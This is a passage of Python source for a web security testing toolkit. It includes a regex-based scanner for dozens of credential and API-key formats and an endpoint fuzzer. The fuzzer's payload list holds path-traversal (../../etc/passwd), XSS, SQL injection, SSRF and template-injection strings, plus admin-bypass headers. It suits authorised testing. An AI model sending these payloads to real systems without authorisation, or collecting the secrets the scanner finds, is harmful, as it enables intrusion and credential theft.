
        for tag, pattern in self.TAG_PATTERNS.items():
            found_urls = pattern.findall(self.html_content)
            self.tag_counts[tag] = len(found_urls)
            for u in found_urls:
                resolved = self.resolve_url(u)
                if resolved and self.is_valid_url(resolved) and self._is_in_scope(resolved):
                    self.urls.add(resolved)

        print(f"[+] Extracted {len(self.urls)} unique URLs from HTML")
        for tag, count in self.tag_counts.items():
            if count > 0:
                print(f"    <{tag}>: {count} URL(s)")

        return self.get_sorted_urls()

    def extract_urls_from_text(self, text: str) -> List[str]:
        """
        Extract URLs from arbitrary text using URL regex.

        Args:
            text: Text content to scan.

        Returns:
            Sorted list of unique URLs.
        """
        found = find_urls_in_text(text)
        for url in found:
            if self._is_in_scope(url):
                self.urls.add(url)

        return self.get_sorted_urls()

    def get_sorted_urls(self) -> List[str]:
        """
        Get deduplicated, sorted URL list.

        Returns:
            Sorted list of URLs.
        """
        return sorted(self.urls)

    def group_by_domain(self) -> Dict[str, List[str]]:
        """
        Group collected URLs by their domain.

        Returns:
            Dict mapping domain -> list of URLs.
        """
        groups: Dict[str, List[str]] = {}
        for url in self.urls:
            try:
                domain = urlparse(url).hostname or "unknown"
                groups.setdefault(domain, []).append(url)
            except Exception:
                groups.setdefault("unknown", []).append(url)
        return {k: sorted(v) for k, v in groups.items()}

    def output_csv(self, filepath: str) -> None:
        """
        Write collected URLs to a CSV file.

        Args:
            filepath: Output CSV file path.
        """
        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        with open(filepath, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["#", "URL", "Domain", "Path", "Tag Source"])
            for i, url in enumerate(self.get_sorted_urls(), 1):
                parsed = urlparse(url)
                writer.writerow([i, url, parsed.hostname, parsed.path, ""])
        print(f"[+] URLs written to {filepath}")


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS: SecretScanner
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class SecretFinding:
    """Data class representing a discovered secret/high-value pattern."""
    type: str
    value: str
    context: str
    confidence: float  # 0.0 to 1.0
    line_number: int = 0
    source: str = ""
    pattern_name: str = ""


class SecretScanner:
    """
    Scan text/files for 30+ types of secrets, API keys, tokens, and credentials.

    Features:
    - Regex catalog organized by provider (AWS, GCP, Azure, Stripe, GitHub, etc.)
    - Context extraction around matches
    - Confidence scoring based on pattern specificity
    - File and text scanning modes
    - Deduplication and filtering of false positives

    Attributes:
        context_lines: Number of context lines to capture around each finding.
        min_confidence: Minimum confidence threshold (0.0-1.0) for reporting.
        findings: List of SecretFinding objects.
    """

    # Secret pattern catalog organized by category
    # Each entry: (pattern_name, regex, base_confidence)
    SECRET_PATTERNS: List[Tuple[str, str, float]] = [
        # ── Cloud Providers ──────────────────────────────────────────────
        ("AWS Access Key ID", r"(?:AKIA[0-9A-Z]{16})", 0.9),
        ("AWS Secret Access Key", r"(?i)(?:(?:aws|amazon)[_-]?(?:secret|access|key|token)|secretaccesskey)[=:]['\"]?([A-Za-z0-9/+=]{40})", 0.95),
        ("AWS Session Token", r"(?i)(?:aws[_-]?session[_-]?token)[=:]['\"]?([A-Za-z0-9/+=]{8,})", 0.8),
        ("AWS MWS Key", r"(?:amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", 0.9),
        ("GCP Service Account JSON", r'"type":\s*"service_account"', 0.95),
        ("GCP API Key", r"(?i)(?:AIza[0-9A-Za-z\-_]{35})", 0.9),
        ("GCP OAuth Client ID", r"(?:\d{12,}-[0-9A-Za-z]{32}\.apps\.googleusercontent\.com)", 0.85),
        ("GCP Private Key ID", r'"private_key_id":\s*"[a-f0-9]{32}"', 0.95),
        ("Azure Storage Account Key", r"(?i)(?:accountkey|account_key|storageaccountkey)[=:]['\"]?([A-Za-z0-9+/=]{86,88})", 0.9),
        ("Azure Client Secret", r"(?i)(?:azure[_-]?client[_-]?secret|clientsecret)[=:]['\"]?([A-Za-z0-9\-_\.]{34})", 0.85),
        ("Azure Connection String", r"(?:DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+;)", 0.9),
        ("Azure DevOps PAT", r"(?:[a-z0-9]{52})", 0.6),  # Needs context check
        ("Azure Service Bus Connection", r"(?:Endpoint=sb://[^;]+;SharedAccessKeyName=[^;]+;SharedAccessKey=[^;]+)", 0.95),

        # ── Payment Processors ──────────────────────────────────────────
        ("Stripe Live Key (secret)", r"(?i)(?:sk_live_[0-9a-zA-Z]{24,})", 0.95),
        ("Stripe Live Key (restricted)", r"(?i)(?:rk_live_[0-9a-zA-Z]{24,})", 0.95),
        ("Stripe Publishable Key", r"(?i)(?:pk_live_[0-9a-zA-Z]{24,})", 0.8),
        ("Stripe Webhook Secret", r"(?i)(?:whsec_[0-9a-zA-Z]{24,})", 0.9),
        ("Braintree Access Token", r"(?:access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32})", 0.9),
        ("Square Access Token", r"(?:sq0atp-[0-9A-Za-z\-_]{22})", 0.9),
        ("Square OAuth Secret", r"(?:sq0csp-[0-9A-Za-z\-_]{43})", 0.85),
        ("PayPal/Braintree Token", r"(?:access_token\$production\$[a-z0-9]{16}\$[a-f0-9]{32})", 0.9),
        ("PayPal OAuth Token", r"(?:A21[A-Za-z0-9_-]{79})", 0.85),

        # ── Version Control & CI/CD ─────────────────────────────────────
        ("GitHub PAT", r"(?i)(?:github[_-]?(?:pat|token|key|secret)|gh[ps]_[0-9a-zA-Z]{36})", 0.95),
        ("GitHub OAuth Access Token", r"(?:gh[ou]_[0-9a-zA-Z]{36})", 0.9),
        ("GitHub Refresh Token", r"(?:ghr_[0-9a-zA-Z]{36,76})", 0.9),
        ("GitLab PAT", r"(?:glpat-[0-9A-Za-z\-_]{20,})", 0.95),
        ("GitLab CI Job Token", r"(?:glci-[0-9a-zA-Z\-_]{22,})", 0.85),
        ("Bitbucket App Password", r"(?i)(?:bitbucket[_-]?(?:password|token|app[_-]?password))[=:]['\"]?([A-Za-z0-9]{32})", 0.85),

        # ── Communication Platforms ─────────────────────────────────────
        ("Slack Bot Token", r"(?:xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24})", 0.95),
        ("Slack Webhook URL", r"(?:https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8,}/B[a-zA-Z0-9_]{8,}/[a-zA-Z0-9_]{24})", 0.95),
        ("Slack Workspace Token", r"(?:xoxa-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24})", 0.9),
        ("Slack User Token", r"(?:xoxp-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24})", 0.9),
        ("Slack App Token", r"(?:xapp-[0-9]-[A-Z0-9]{10,13}-[a-zA-Z0-9]{24})", 0.95),
        ("Discord Bot Token", r"(?:[MN][A-Za-z\d]{23,25}\.[A-Za-z\d]{6}\.[A-Za-z\d\-_]{27,38})", 0.95),
        ("Discord Webhook URL", r"(?:https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]{68})", 0.95),
        ("Telegram Bot Token", r"(?:\d{8,10}:[A-Za-z0-9_-]{35})", 0.9),
        ("Twilio API Key", r"(?:SK[a-f0-9]{32})", 0.85),
        ("Twilio Account SID", r"(?:AC[a-f0-9]{32})", 0.8),
        ("Twilio Auth Token", r"(?i)(?:twilio[_-]?(?:auth[_-]?)?token)[=:]['\"]?([a-f0-9]{32})", 0.9),

        # ── Package Registries & Deployment ─────────────────────────────
        ("npm Access Token", r"(?:npm_[A-Za-z0-9]{36})", 0.95),
        ("npm Auth Token", r"(?i)(?://registry\.npmjs\.org/:_authToken)[=:]\s*['\"]?([A-Za-z0-9\-_]{36})", 0.95),
        ("PyPI Token", r"(?:pypi[-_]?A?g?g?[_-]?[Tt]oken|__token__)[=:]['\"]?([a-zA-Z0-9_\-]{20,})", 0.85),
        ("Gemfury Key", r"(?:FURY[=:]['\"]?[a-zA-Z0-9\-_]{40})", 0.8),
        ("Docker Hub PAT", r"(?:dckr_pat_[A-Za-z0-9_-]{26,})", 0.9),

        # ── SaaS & Infrastructure ───────────────────────────────────────
        ("Heroku API Key", r"(?:[hH][eE][rR][oO][kK][uU].*?[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", 0.85),
        ("Heroku OAuth Secret", r"(?:heroku[_-]?(?:oauth[_-]?)?secret)[=:]['\"]?([a-f0-9]{40})", 0.85),
        ("SendGrid API Key", r"(?i)(?:SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43})", 0.95),
        ("Mailgun API Key", r"(?:key-[a-f0-9]{32})", 0.9),
        ("Mailchimp API Key", r"(?:[a-f0-9]{32}-us[0-9]{1,2})", 0.85),
        ("HubSpot API Key", r"(?i)(?:hubspot[_-]?(?:api[_-]?)?key)[=:]['\"]?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", 0.8),
        ("Salesforce Token", r"(?:00D[a-zA-Z0-9]{12,14})", 0.7),
        ("JWT Token", r"(?:eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})", 0.7),
        ("Firebase URL", r"(?:https://[a-zA-Z0-9-]+\.firebaseio\.com)", 0.7),
        ("Firebase API Key", r"(?i)(?:firebase[_-]?(?:api[_-]?)?key)[=:]['\"]?([A-Za-z0-9_-]{30,})", 0.85),
        ("Firebase Database URL", r'(?:https://[a-z0-9-]+\.firebaseio\.com)', 0.7),
        ("Firebase Project ID", r'(?:["\']project_id["\'][=:]\s*["\'][a-z0-9-]+["\'])', 0.6),
        ("Pusher App Key", r"(?:\d{7,8}:[a-f0-9]{64})", 0.7),
        ("Algolia API Key", r"(?i)(?:algolia[_-]?(?:api[_-]?)?key)[=:]['\"]?([A-Za-z0-9]{32})", 0.85),
        ("Datadog API Key", r"(?i)(?:datadog[_-]?api[_-]?key)[=:]['\"]?([a-f0-9]{32})", 0.85),
        ("Datadog App Key", r"(?i)(?:datadog[_-]?app[_-]?key)[=:]['\"]?([a-f0-9]{40})", 0.85),
        ("New Relic License Key", r"(?i)(?:new_relic_license_key|newrelic[_-]?license[_-]?key)[=:]['\"]?([a-f0-9]{40})", 0.85),
        ("New Relic API Key", r"(?i)(?:new_relic_api_key|newrelic[_-]?api[_-]?key)[=:]['\"]?([a-f0-9]{40})", 0.85),

        # ── Database & Storage ──────────────────────────────────────────
        ("PostgreSQL Connection String", r"(?:postgres(?:ql)?://[^:]+:[^@]+@[^:]+:\d+/[^?\s]+)", 0.9),
        ("MySQL Connection String", r"(?:mysql://[^:]+:[^@]+@[^:]+:\d+/[^?\s]+)", 0.9),
        ("MongoDB Connection String", r"(?:mongodb(?:\+srv)?://[^:]+:[^@]+@[^:]+:\d+/[^?\s]+)", 0.9),
        ("Redis Connection String", r"(?:redis://[^:]+:[^@]+@[^:]+:\d+)", 0.85),
        ("Elasticsearch Connection", r"(?:https?://[^:]+:[^@]+@[^:]+:\d+)", 0.7),

        # ── Private Keys & Certificates ─────────────────────────────────
        ("RSA Private Key", r"-----BEGIN RSA PRIVATE KEY-----", 1.0),
        ("EC Private Key", r"-----BEGIN EC PRIVATE KEY-----", 1.0),
        ("DSA Private Key", r"-----BEGIN DSA PRIVATE KEY-----", 1.0),
        ("OpenSSH Private Key", r"-----BEGIN OPENSSH PRIVATE KEY-----", 1.0),
        ("PGP Private Key", r"-----BEGIN PGP PRIVATE KEY BLOCK-----", 1.0),
        ("Generic Private Key", r"-----BEGIN PRIVATE KEY-----", 1.0),
        ("Certificate", r"-----BEGIN CERTIFICATE-----", 0.9),
        ("Encrypted Private Key", r"-----BEGIN ENCRYPTED PRIVATE KEY-----", 0.95),

        # ── Generic API Keys ────────────────────────────────────────────
        ("Generic API Key", r"(?i)(?:api[_-]?key|apikey)[=:]['\"]?([a-f0-9]{32,40})", 0.7),
        ("Generic Bearer Token", r"(?i)(?:bearer\s+[A-Za-z0-9\-_.]{20,})", 0.6),
        ("Generic Secret", r"(?i)(?:secret|token|password|passwd)[=:]['\"]?([A-Za-z0-9!@#$%^&*()_+\-={}|;:',.<>?\/]{20,50})", 0.4),

        # ── OAuth & Identity ────────────────────────────────────────────
        ("OAuth Client Secret", r"(?i)(?:client[_-]?secret|client_secret|clientsecret)[=:]['\"]?([A-Za-z0-9\-_\.]{20,})", 0.85),
        ("OAuth 2.0 Token", r"(?:ya29\.[A-Za-z0-9\-_]+)", 0.85),  # Google OAuth
        ("SAML Certificate", r"(?:-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----)", 0.8),
        ("JWT with HMAC Secret", r'(?:["\']secret["\']\s*[:=]\s*["\'][A-Za-z0-9+/=]{16,}["\'])', 0.7),

        # ── SaaS & Platforms ───────────────────────────────────────────
        ("Shopify Access Token", r"(?:shpat_[a-fA-F0-9]{32})", 0.9),
        ("Shopify Shared Secret", r"(?:shpss_[a-fA-F0-9]{32})", 0.9),
        ("WooCommerce API Key", r"(?i)(?:woocommerce[_-]?(?:api[_-]?)?key)[=:]['\"]?([a-f0-9]{32})", 0.8),
        ("Netlify API Token", r"(?i)(?:netlify[_-]?(?:api[_-]?)?token)[=:]['\"]?([A-Za-z0-9_-]{40,})", 0.85),
        ("Vercel Access Token", r"(?i)(?:vercel[_-]?(?:access[_-]?)?token)[=:]['\"]?([A-Za-z0-9]{24,})", 0.85),
        ("Cloudflare API Key", r"(?i)(?:cloudflare[_-]?(?:api[_-]?)?key)[=:]['\"]?([a-f0-9]{37})", 0.85),
        ("Cloudflare Global Key", r"(?i)(?:cloudflare[_-]?(?:global[_-]?)?(?:api[_-]?)?key)[=:]['\"]?([a-f0-9]{37})", 0.9),
        ("Cloudflare Origin CA Key", r"(?:v1\.0-[a-f0-9]{24}-[a-f0-9]{14}-[a-f0-9]{8})", 0.85),
        ("DigitalOcean PAT", r"(?:dop_v1_[a-f0-9]{64})", 0.9),
        ("DigitalOcean OAuth Token", r"(?i)(?:digitalocean[_-]?(?:oauth[_-]?)?token)[=:]['\"]?([a-f0-9]{64})", 0.85),
        ("Linode v4 API Key", r"(?i)(?:linode[_-]?(?:api[_-]?|v4[_-]?)?key)[=:]['\"]?([a-f0-9]{64})", 0.85),
        ("Confluent Cloud API Key", r"(?i)(?:confluent[_-]?(?:cloud[_-]?)?(?:api[_-]?)?key)[=:]['\"]?([A-Za-z0-9]{16})", 0.8),
        ("Confluent Cloud Secret", r"(?i)(?:confluent[_-]?(?:cloud[_-]?)?secret)[=:]['\"]?([A-Za-z0-9/+=]{64})", 0.85),

        # ── Monitoring & Analytics ──────────────────────────────────────
        ("Sentry DSN", r"(?:https://[a-f0-9]{32}@[a-f0-9]{32}\.ingest\.sentry\.io/\d+)", 0.9),
        ("Sentry Auth Token", r"(?:sntrys_[A-Za-z0-9]{40})", 0.9),
        ("Rollbar Access Token", r"(?i)(?:rollbar[_-]?(?:access[_-]?)?token)[=:]['\"]?([a-f0-9]{32})", 0.85),
        ("Loggly Token", r"(?i)(?:loggly[_-]?(?:token|customer[_-]?token))[=:]['\"]?([a-f0-9]{36}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", 0.8),
    ]

    # Patterns to ignore (false positive reduction)
    FALSE_POSITIVE_PATTERNS = [
        re.compile(r"(?:example|sample|test|dummy|placeholder|your-|your_|xxx|0{10,}|a{10,})", re.IGNORECASE),
        re.compile(r"(?:github\.com/[^/]+/[^/]+/blob/)"),  # Example code references
        re.compile(r"(?:https?://www\.[^/]+\.com)"),  # Generic URLs
    ]

    def __init__(self, context_lines: int = 2, min_confidence: float = 0.5):
        """
        Initialize SecretScanner.

        Args:
            context_lines: Number of lines of context to capture around each finding.
            min_confidence: Minimum confidence score (0-1) to include in results.
        """
        self.context_lines = context_lines
        self.min_confidence = min_confidence
        self.findings: List[SecretFinding] = []
        self._compiled_patterns: List[Tuple[str, re.Pattern, float]] = [
            (name, re.compile(pat), conf) for name, pat, conf in self.SECRET_PATTERNS
        ]

    def scan_text(self, text: str, source_label: str = "text") -> List[Dict[str, Any]]:
        """
        Scan a string of text for secrets.

        Args:
            text: The string content to scan.
            source_label: Label for the source (e.g. filename, URL).

        Returns:
            List of finding dicts with type, value, context, confidence.
        """
        self.findings = []
        lines = text.splitlines()
        full_text_lower = text.lower()

        # Check false positive indicators on the entire block
        is_likely_fp = any(
            fp.search(full_text_lower) for fp in self.FALSE_POSITIVE_PATTERNS
        )

        for pattern_name, compiled_re, base_conf in self._compiled_patterns:
            for match in compiled_re.finditer(text):
                value = match.group(0)
                confidence = base_conf

                # Extract line number and context
                line_num = text[:match.start()].count("\n") + 1
                context_start = max(0, line_num - self.context_lines - 1)
                context_end = min(len(lines), line_num + self.context_lines)
                context_snippet = "\n".join(lines[context_start:context_end])

                # Confidence adjustments
                if is_likely_fp and any(fp.search(value) for fp in self.FALSE_POSITIVE_PATTERNS):
                    confidence *= 0.3  # Penalize likely false positives

                # Length-based adjustment: very long values are often noise
                if len(value) > 200:
                    confidence *= 0.5
                elif len(value) < 8:
                    confidence *= 0.3

                # Penalize base64-looking noise that doesn't match known formats
                if base_conf < 0.6 and re.match(r'^[A-Za-z0-9+/=]{30,}$', value):
                    confidence *= 0.5

                if confidence >= self.min_confidence:
                    self.findings.append(SecretFinding(
                        type=pattern_name,
                        value=value[:500],  # Truncate very long values
                        context=context_snippet[:500],
                        confidence=round(confidence, 2),
                        line_number=line_num,
                        source=source_label,
                        pattern_name=pattern_name,
                    ))

        # Deduplicate by value+type
        seen: Set[str] = set()
        deduped = []
        for f in self.findings:
            key = f"{f.type}:{f.value[:80]}"
            if key not in seen:
                seen.add(key)
                deduped.append(f)

        self.findings = deduped
        return [asdict(f) for f in self.findings]

    def scan_file(self, filepath: str) -> List[Dict[str, Any]]:
        """
        Scan a file for secrets.

        Handles text files (read as UTF-8) and binary files (scanned as string).

        Args:
            filepath: Path to the file to scan.

        Returns:
            List of finding dicts (same as scan_text).
        """
        if not os.path.isfile(filepath):
            print(f"[!] File not found: {filepath}", file=sys.stderr)
            return []

        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            print(f"[!] Failed to read {filepath}: {e}", file=sys.stderr)
            return []

        return self.scan_text(content, source_label=filepath)

    def scan_directory(self, directory: str, extensions: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """
        Recursively scan all files in a directory for secrets.

        Args:
            directory: Root directory to scan.
            extensions: Optional list of file extensions to filter (e.g. ['.js', '.py', '.env']).
                       If None, scans all files.

        Returns:
            List of all findings across all scanned files.
        """
        if not os.path.isdir(directory):
            print(f"[!] Directory not found: {directory}", file=sys.stderr)
            return []

        all_findings: List[Dict[str, Any]] = []
        scanned = 0

        for root, dirs, files in os.walk(directory):
            # Skip common directories with false positives
            dirs[:] = [d for d in dirs if d not in (".git", "node_modules", "__pycache__",
                                                     ".svn", ".hg", "venv", ".venv",
                                                     "dist", "build", ".next")]
            for filename in files:
                filepath = os.path.join(root, filename)
                if extensions and not any(filename.endswith(ext) for ext in extensions):
                    continue
                try:
                    size = os.path.getsize(filepath)
                    if size > 10 * 1024 * 1024:  # Skip files > 10MB
                        continue
                    findings = self.scan_file(filepath)
                    if findings:
                        all_findings.extend(findings)
                    scanned += 1
                except Exception:
                    continue

        print(f"[+] Scanned {scanned} files in {directory}")
        print(f"[+] Found {len(all_findings)} potential secret(s)")

        return all_findings

    def get_summary(self) -> Dict[str, Any]:
        """
        Get a summary of scan results grouped by type.

        Returns:
            Dict with count by type, confidence range, and top findings.
        """
        type_counts: Dict[str, int] = {}
        for f in self.findings:
            type_counts[f.type] = type_counts.get(f.type, 0) + 1

        high_conf = sum(1 for f in self.findings if f.confidence >= 0.9)
        med_conf = sum(1 for f in self.findings if 0.7 <= f.confidence < 0.9)
        low_conf = sum(1 for f in self.findings if f.confidence < 0.7)

        return {
            "total_findings": len(self.findings),
            "unique_types": len(type_counts),
            "by_type": dict(sorted(type_counts.items(), key=lambda x: -x[1])),
            "confidence_high": high_conf,
            "confidence_medium": med_conf,
            "confidence_low": low_conf,
        }


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS: EndpointFuzzer
# ═══════════════════════════════════════════════════════════════════════════════

class EndpointFuzzer:
    """
    Generate parameter permutations and URL variants for endpoint fuzzing.

    Features:
    - Add/remove/modify common parameters
    - HTTP method variations
    - Header injection variants
    - Parameter pollution
    - Detect response changes (status, length, body hash)

    Attributes:
        base_url: The target endpoint URL.
        method: HTTP method to use.
        params: Existing parameters dict.
        variants: Generated list of test variants.
    """

    # Common API parameters worth testing
    COMMON_PARAMS = [
        "id", "user_id", "userId", "uid", "username", "email", "token",
        "key", "api_key", "apiKey", "secret", "auth", "session",
        "page", "limit", "offset", "sort", "order", "filter",
        "q", "query", "search", "term", "debug", "verbose",
        "callback", "redirect", "url", "next", "return", "returnUrl",
        "format", "type", "lang", "locale", "admin", "test",
        "timestamp", "nonce", "sig", "signature", "hmac",
        "access_token", "accessToken", "refresh_token",
        "include", "exclude", "fields", "expand", "embed",
    ]

    # Parameter values for fuzzing
    PARAM_VALUES = [
        "",                                          # Empty
        "1",                                         # Numeric
        "true",                                      # Boolean
        "null",                                      # Null
        "admin",                                     # Admin
        "../../etc/passwd",                          # LFI
        "<script>alert(1)</script>",                 # XSS
        "' OR '1'='1",                               # SQLi
        "http://localhost",                          # SSRF
        "{{7*7}}",                                   # SSTI
        '${{7*7}}',                                  # SSTI alt
    ]

    # HTTP method variants
    METHOD_VARIANTS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

    def __init__(self, base_url: str, method: str = "GET", params: Optional[Dict[str, str]] = None):
        """
        Initialize EndpointFuzzer.

        Args:
            base_url: Target endpoint URL (can contain query string).
            method: HTTP method for requests.
            params: Initial parameter dict.
        """
        self.base_url = base_url
        self.method = method.upper()
        self.params = params or {}
        self.variants: List[Dict[str, Any]] = []
        self.results: List[Dict[str, Any]] = []

        # Parse existing params from URL
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query, keep_blank_values=True)
        for k, v in existing_params.items():
            self.params[k] = v[0] if v else ""

        # Clean URL (remove query string for variant generation)
        self.clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def generate_param_permutations(self) -> List[Dict[str, Any]]:
        """
        Generate parameter permutations by adding/removing/modifying params.

        Returns:
            List of variant dicts with 'url', 'params', 'method', 'description'.
        """
        self.variants = []

        # 1. Remove each existing parameter
        for key in list(self.params.keys()):
            new_params = {k: v for k, v in self.params.items() if k != key}
            self.variants.append({
                "url": self.clean_url,
                "params": new_params,
                "method": self.method,
                "description": f"Remove parameter: {key}",
            })

        # 2. Add common params with various values
        for param_name in self.COMMON_PARAMS[:20]:  # Limit to first 20
            if param_name not in self.params:
                for val in self.PARAM_VALUES[:3]:  # First 3 values
                    new_params = dict(self.params)
                    new_params[param_name] = val
                    self.variants.append({
                        "url": self.clean_url,
                        "params": new_params,
                        "method": self.method,
                        "description": f"Add {param_name}={val}",
                    })

        # 3. Modify existing params with fuzz values
        for key in list(self.params.keys()):
            for val in self.PARAM_VALUES:
                new_params = dict(self.params)
                new_params[key] = val
                self.variants.append({
                    "url": self.clean_url,
                    "params": new_params,
                    "method": self.method,
                    "description": f"Set {key}={val}",
                })

        # 4. Duplicate params (parameter pollution)
        for key in list(self.params.keys()):
            dup_params = dict(self.params)
            dup_params[f"{key}"] = self.params[key]
            dup_params[f"{key}"] = "admin"
            dup_params[f"{key}[0]"] = self.params[key]
            dup_params[f"{key}[0]"] = "admin"
            self.variants.append({
                "url": self.clean_url,
                "params": dup_params,
                "method": self.method,
                "description": f"Parameter pollution: {key}",
            })

        # 5. Append common suffixes to params
        for suffix in ["[]", "[0]", "[]]", "[admin]"]:
            for key in list(self.params.keys()):
                new_params = dict(self.params)
                new_params[f"{key}{suffix}"] = "1"
                self.variants.append({
                    "url": self.clean_url,
                    "params": new_params,
                    "method": self.method,
                    "description": f"Suffixed param: {key}{suffix}",
                })

        return self.variants

    def generate_method_variants(self) -> List[Dict[str, Any]]:
        """
        Generate variants with different HTTP methods.

        Returns:
            List of variant dicts with method changes.
        """
        method_variants = []
        for method in self.METHOD_VARIANTS:
            if method != self.method:
                method_variants.append({
                    "url": self.clean_url,
                    "params": dict(self.params),
                    "method": method,
                    "description": f"Method override: {method}",
                })
        self.variants.extend(method_variants)
        return method_variants

    def generate_header_variants(self) -> List[Dict[str, str]]:
        """
        Generate header injection variants (content-type, accept, auth bypass).

        Returns:
            List of header dicts.
        """
        header_variants = [
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/xml"},
            {"Content-Type": "text/plain"},
            {"Accept": "application/json"},
            {"Accept": "application/xml"},
            {"Accept": "text/html"},
            {"Accept": "*/*"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-HTTP-Method-Override": "POST"},
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method-Override": "PATCH"},
        ]
        return header_variants

    def generate_all_variants(self) -> List[Dict[str, Any]]:
        """
        Generate all fuzzing variants: params, methods, and headers combined.

        Returns:
            Full list of variant configs.
        """
        self.generate_param_permutations()
        self.generate_method_variants()
        return self.variants

    def _build_url(self, params: Dict[str, str]) -> str:
        """
        Build URL from clean URL and params dict.

        Args:
            params: Query parameters dict.

        Returns:
            Full URL string.
        """
        if not params:
            return self.clean_url
        query = urllib.parse.urlencode(params, doseq=True)
        return f"{self.clean_url}?{query}"

    def detect_response_change(self, baseline: Dict[str, Any], variant: Dict[str, Any]) -> Dict[str, Any]:
        """
        Compare a variant response against the baseline to detect changes.

        Args:
            baseline: Baseline response dict (status, size, body_hash).
            variant: Variant response dict.

        Returns:
            Dict describing what changed (status, length, body, etc.).
        """
        changes = {}

        if variant.get("status") != baseline.get("status"):
            changes["status"] = f"{baseline.get('status')} -> {variant.get('status')}"

        if variant.get("size") != baseline.get("size"):
            changes["size"] = f"{baseline.get('size')} -> {variant.get('size')}"

        if variant.get("body_hash") != baseline.get("body_hash"):
            changes["body"] = "Content changed"

        return changes

    def get_summary(self) -> Dict[str, Any]:
        """
        Get summary of generated fuzzing variants.

        Returns:
            Dict with variant counts and coverage info.
        """
        methods_used = set(v["method"] for v in self.variants)
        unique_params = set()
        for v in self.variants:
            unique_params.update(v.get("params", {}).keys())

        return {
            "total_variants": len(self.variants),
            "base_url": self.base_url,
            "methods": sorted(methods_used),
            "unique_params_tested": len(unique_params),
            "param_permutations": sum(1 for v in self.variants if v.get("description", "").startswith("Set ")),
            "method_overrides": sum(1 for v in self.variants if v.get("description", "").startswith("Method")),
        }


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS: Base64Toolkit
# ═══════════════════════════════════════════════════════════════════════════════

class Base64Toolkit:
    """
    Base64 decoding toolkit with support for multiple variants and encoding detection.

    Features:
    - Standard base64, base64url, base64 with padding variations
    - JWT segment decoding
    - Detecting encoded content (heuristic scoring)
    - Try all decoding variants and return the most likely result
    - Recursive decoding (handle nested base64)

    Attributes:
        input_string: The string to analyze/decode.
        decoded_results: Dict of variant -> decoded result or error.
    """

    # Base64 character sets for detection
    B64_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
    B64URL_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=")

    # Content type heuristics
    CONTENT_PATTERNS = {
        "json": [re.compile(r'^\s*[{[]'), re.compile(r'^[{[]')],
        "html": [re.compile(r'^\s*<html', re.IGNORECASE), re.compile(r'<!DOCTYPE', re.IGNORECASE)],
        "jwt": [re.compile(r'^eyJ'), re.compile(r'^\{"alg"')],
        "url": [re.compile(r'^https?://', re.IGNORECASE)],
        "binary": [re.compile(r'^[\x00-\x08\x0B\x0C\x0E-\x1F]')],
    }

    def __init__(self, input_string: str = ""):
        """
        Initialize Base64Toolkit.

        Args:
            input_string: The string to analyze or decode.
        """
        self.input_string = input_string
        self.decoded_results: Dict[str, Any] = {}

    def set_input(self, input_string: str) -> None:
        """Set the input string for analysis."""
        self.input_string = input_string

    def is_base64(self, s: str) -> bool:
        """
        Quick heuristic check if a string looks like base64.

        Checks character set, length constraints, and padding.

        Args:
            s: String to check.

        Returns:
            True if the string looks like base64 content.
        """
        if not s or len(s) < 4:
            return False
        # Must be mostly base64 characters
        b64_ratio = sum(1 for c in s if c in self.B64_CHARS) / len(s)
        if b64_ratio < 0.85:
            return False
        # Length should be multiple of 4 ideally
        return True

    def decode_standard(self, data: str) -> Tuple[bool, Union[str, bytes]]:
        """
        Decode standard base64 (with padding).

        Args:
            data: Base64 string.

        Returns:
            Tuple of (success, decoded_string_or_error_bytes).
        """
        try:
            decoded = base64.b64decode(data, validate=True)
            return True, decoded
        except Exception as e:
            return False, str(e)

    def decode_urlsafe(self, data: str) -> Tuple[bool, Union[str, bytes]]:
        """
        Decode base64url (URL-safe variant, no padding required).

        Args:
            data: Base64url string.

        Returns:
            Tuple of (success, decoded_string_or_error_bytes).
        """
        try:
            decoded = base64.urlsafe_b64decode(data + "==")
            return True, decoded
        except Exception:
            try:
                decoded = base64.urlsafe_b64decode(data)
                return True, decoded
            except Exception as e:
                return False, str(e)

    def _try_decode_as_text(self, data: bytes) -> str:
